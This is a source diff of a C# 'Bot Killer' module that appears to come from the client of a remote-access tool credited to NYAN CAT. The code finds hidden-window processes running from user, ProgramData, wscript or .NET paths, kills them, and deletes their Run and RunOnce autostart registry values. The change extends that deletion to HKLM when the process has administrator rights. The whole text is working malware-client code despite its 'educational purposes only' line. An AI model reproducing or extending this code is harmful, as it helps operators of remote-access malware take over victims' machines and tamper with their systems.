@@ -5,16 +5,17 @@ using System.Runtime.InteropServices;
 using Microsoft.Win32;
 using Client.MessagePack;
 using Client.Sockets;
+using System.Security.Principal;
 
 //       │ Author     : NYAN CAT
-//       │ Name       : Bot Killer v0.2
+//       │ Name       : Bot Killer v0.2.5
 //       │ Contact    : https://github.com/NYAN-x-CAT
 
 //       This program Is distributed for educational purposes only.
 
 namespace Client.Handle_Packet
 {
-   public class HandleBotKiller
+    public class HandleBotKiller
     {
         int count = 0;
         public void RunBotKiller()
@@ -24,10 +25,10 @@ namespace Client.Handle_Packet
             {
                 try
                 {
-                    string pName = p.MainModule.FileName;
-                    if (Inspection(pName))
+                    if (Inspection(p.MainModule.FileName))
                         if (!IsWindowVisible(p.MainWindowHandle))
                         {
+                            string pName = p.MainModule.FileName;
                             p.Kill();
                             RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\Run", pName);
                             RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", pName);
@@ -47,13 +48,13 @@ namespace Client.Handle_Packet
             }
         }
 
-        private bool Inspection(string payload)
+        private bool Inspection(string threat)
         {
-            if (payload == Process.GetCurrentProcess().MainModule.FileName) return false;
-            if (payload.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))) return true;
-            if (payload.Contains(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))) return true;
-            if (payload.Contains("wscript.exe")) return true;
-            if (payload.Contains(RuntimeEnvironment.GetRuntimeDirectory())) return true;
+            if (threat == Process.GetCurrentProcess().MainModule.FileName) return false;
+            if (threat.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))) return true;
+            if (threat.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))) return true;
+            if (threat.Contains("wscript.exe")) return true;
+            if (threat.StartsWith(Path.Combine(Path.GetPathRoot(Environment.SystemDirectory), "Windows\\Microsoft.NET"))) return true;
             return false;
         }
 
@@ -62,16 +63,35 @@ namespace Client.Handle_Packet
             return IsWindowVisible(lHandle);
         }
 
-        private void RegistryDelete(string regPath, string payload)
+        private static void RegistryDelete(string regPath, string payload)
         {
-            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true))
+            try
             {
-                if (key != null)
-                    foreach (string ValueOfName in key.GetValueNames())
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true))
+                {
+                    if (key != null)
+                        foreach (string valueOfName in key.GetValueNames())
+                        {
+                            if (key.GetValue(valueOfName).ToString().Equals(payload))
+                                key.DeleteValue(valueOfName);
+                        }
+                }
+                if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+                {
+                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, true))
                     {
-                        if (key.GetValue(ValueOfName).ToString().Equals(payload))
-                            key.DeleteValue(ValueOfName);
+                        if (key != null)
+                            foreach (string valueOfName in key.GetValueNames())
+                            {
+                                if (key.GetValue(valueOfName).ToString().Equals(payload))
+                                    key.DeleteValue(valueOfName);
+                            }
                     }
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine("RegistryDelete: " + ex.Message);
             }
         }
 
